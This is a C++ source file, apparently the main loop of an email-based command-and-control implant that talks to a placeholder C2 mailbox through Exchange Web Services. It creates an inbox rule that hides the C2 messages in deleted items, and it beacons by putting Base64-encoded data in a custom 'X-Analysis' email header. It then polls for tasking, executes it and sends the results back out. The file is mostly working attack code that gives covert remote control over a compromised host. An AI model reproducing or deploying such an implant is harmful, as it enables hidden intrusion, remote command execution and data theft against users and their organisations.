#include <Windows.h>
#include "EWS.h"
#include "Base64.h"
#include "Tasking.h"

#define C2_MAILBOX	"mail@<domain.com>"

#define RULE_NAME	"KeepThingsClean"
#define MOVE_FOLDER "deleteditems"
#define C2_HEADER	"X-Analysis"
#define LOOP_SLEEP 5 * 1000 // seconds

bool Running = TRUE;

int main()
{
	EWSConnector ews;

	if (!ews.Initialize()) {
		printf("[!] Failed to initialize EWS connector\n");
		return 1;
	}

	if (!ews.DoesRuleExist(RULE_NAME)) {
		
		printf("[+] Rule '%s' does not exist. Creating ...\n", RULE_NAME);

		if (!ews.CreateMoveRule(RULE_NAME, C2_MAILBOX, MOVE_FOLDER)) {
			printf("[!] Failed to create rule '%s'\n", RULE_NAME);
			return 1;
		}

	}

	printf("[+] Auto-hide rule '%s' is ready\n", RULE_NAME);

	std::string outboundData = "HELLO";
	std::string inboundData;
	std::string codedData;

	while (Running) {
		
		if (!outboundData.empty()) {

			if (!Base64Encode(outboundData, &codedData)) {
				printf("[!] Failed to Base64 encode data\n");
				Running = FALSE;
			}

			printf("[+] Sending beacon\n");

			if (!ews.SendEmailWithHeader(C2_MAILBOX, C2_HEADER, codedData.c_str())) {
				printf("[!] Failed to beacon to '%s'\n", C2_MAILBOX);
				Running = FALSE;
			}

			outboundData.clear();
		}

		Sleep(LOOP_SLEEP);

		if (!ews.SearchEmailAndExtractHeader(C2_MAILBOX, MOVE_FOLDER, C2_HEADER, codedData)) {
			printf("[!] Failed to search email");
			Running = FALSE;
		}

		if (!codedData.empty()) {

			printf("[+] Got tasking... executing.\n");

			if (!Base64Decode(codedData, &inboundData)) {
				printf("[!] Failed to Base64 decode data\n");
				Running = FALSE;
			}

			if (!ExecuteTasking(inboundData, outboundData)) {
				printf("[!] Failed to execute tasking\n");
				Running = FALSE;
			}

			inboundData.clear();
		}
	}

	printf("[+] Goodbye.\n");

	return 0;
}
